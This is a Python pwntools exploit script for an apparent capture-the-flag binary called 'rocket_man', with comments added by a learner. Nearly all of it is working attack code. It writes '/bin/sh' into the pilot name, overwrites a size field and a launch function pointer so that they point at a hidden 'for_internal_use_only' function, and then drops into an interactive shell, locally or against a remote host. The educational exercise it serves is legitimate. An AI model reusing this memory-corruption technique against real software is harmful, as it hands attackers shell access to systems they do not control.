#!/usr/bin/env python3

'''
comments are made by me for understanding the exploit, not by the author (niktay)
'''

from pwn import *

HOST = "localhost"
PORT = 1337

CHOICE_PROMPT = "➤ "
PILOT_NAME_PROMPT = "Pilot Name: "

ROCKET_SIZE_OFFSET = 60
LAUNCH_FUNCTION_OFFSET = 132

elf = context.binary = ELF("./rocket_man")

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = elf.process()


def order_rocket():
    io.sendlineafter(CHOICE_PROMPT, b"1")

# sets a name for the pilot, with the name as "test"
def get_license(name: bytes = b"test"):
    io.sendlineafter(CHOICE_PROMPT, b"2")
    io.sendlineafter(PILOT_NAME_PROMPT, name)

# longer way to call get_license()
def update_name(name: bytes):
    get_license(name)


def launch_rocket():
    io.sendlineafter(CHOICE_PROMPT, b"3")


get_license() #first setting the name as test
order_rocket() # getting a rocket
update_name(
    fit(
        b"/bin/sh\x00", # set name to /bin/sh
        {
            ROCKET_SIZE_OFFSET: 0x51,
            LAUNCH_FUNCTION_OFFSET: elf.sym.for_internal_use_only,
        },
    )
)
launch_rocket()

io.interactive()
